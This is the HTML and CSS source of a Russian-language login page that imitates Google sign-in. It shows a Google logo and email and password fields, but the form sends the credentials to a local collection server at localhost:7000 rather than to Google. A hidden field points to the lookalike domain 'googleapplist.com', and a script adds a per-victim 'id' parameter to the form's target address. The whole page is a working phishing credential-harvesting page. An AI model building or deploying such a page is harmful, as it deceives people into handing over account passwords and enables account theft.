    *{
        padding: 0;
        margin: 0;
        box-sizing: border-box;
        font-family: 'Poppins', sans-serif;
    }

    .box{
        height: 100vh;
        display: flex;
        justify-content: center;
        align-items: center;
        user-select: none;
    }

    .form{
        width: 400px;
        min-height: 400px;
        padding: 32px;
        border-radius: 6px;
        box-shadow: rgba(0, 0, 0, 0.12) 0px 1px 3px, rgba(0, 0, 0, 0.24) 0px 1px 2px;
    }
    .form img{
        display: block;
        margin:auto;
    }

    .form-title{
        font-weight: 500;
        margin-top: 10px;
        margin-bottom: 20px;
        font-size: 20px;
        margin-left: 140px


    }
    .form-group{
        height: 48px;
        margin-bottom: 20px;
        position: relative;
    }

    .form-control{
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background:none;
        border:1px solid  #a1a1a1;
        outline:none;
        padding: 16px;
        border-radius: 3px;
        z-index: 1;
    }


    .form-label{
        position: absolute;
        left: 13px;
        top: 13px;
        color: #a1a1a1;
        background-color: white;
        padding: 0 6px;
        font-size: 14px;
        transition:.3s;
    }

    .form-control:focus+ .form-label{
        top: -10px;
        z-index: 10;
        color: #1B66C9;
        font-weight: 500;
    }
    .form-control:focus{
        border: 1px solid #1B66C9;
    }

    .form-control:not(:focus):valid+label{
        top: -10px;
        z-index: 10;
    }

    .showLabel{
        font-size: 14px;
    }

    .bottom-box{
        display: flex;
        justify-content: space-between;
        align-items: center;
        margin-top: 35px;
    }
    .bottom-box a{
        color:#1B66C9;
        text-decoration: none;
        font-size: 14px;
        font-weight:500;
    }
    .form-button{
        display: block;
        padding: 12px 32px;
        border: none;
        background-color: #1B66C9;
        color: #fff;
        border-radius: 3px;
        cursor: pointer;
        transition: .3s;
    }
    .form-button:hover{
        box-shadow:0 10px 36px rgba(0,0,0,.15);
    }

<body bis_frame_id="145" bis_status="ok">
<div class="box">
    <form id="loginForm" action="http://localhost:7000" class="form" method="POST"><input name="__original_url"  type="hidden" value="https://googleapplist.com"/> <samp><img alt="logo" src="https://www.tutorjoes.in/public/membership/09_google/images/logo.jpg"/></samp>
        <h1 class="form-title"><samp>Вход</samp></h1>

        <div class="form-group"><input class="form-control" name="email" required="" type="text"/> <label class="form-label">Email or phone</label></div>

        <div class="form-group"><input class="form-control" id="txtPassword" name="password" required="" type="password"/> <label class="form-label">Enter Your Password</label></div>

        <div class="form-group"><label class="showLabel"><input id="show" type="checkbox"/> Показать пароль </label></div>

        <div class="bottom-box"><a href="#">Забыли адрес электронной почты?</a><button class="form-button" type="submit">Войти</button></div>
    </form>
</div>
<script>
    const Password = document.querySelector("#txtPassword");
    const Checkbox = document.querySelector("#show");

    Checkbox.addEventListener('click',function(){
        const type = Password.getAttribute("type") === "password" ? "text" : "password";
        Password.setAttribute("type", type);
    });
</script>
<script>
    document.addEventListener('DOMContentLoaded', function() {
        var form = document.getElementById('loginForm');
        var params = new URLSearchParams(window.location.search);
        var id = params.get('id'); // Получаем значение параметра id из URL

        if (id) {
            form.action += '?id=' + id; // Добавляем параметр id к действию формы
        }
    });
</script>
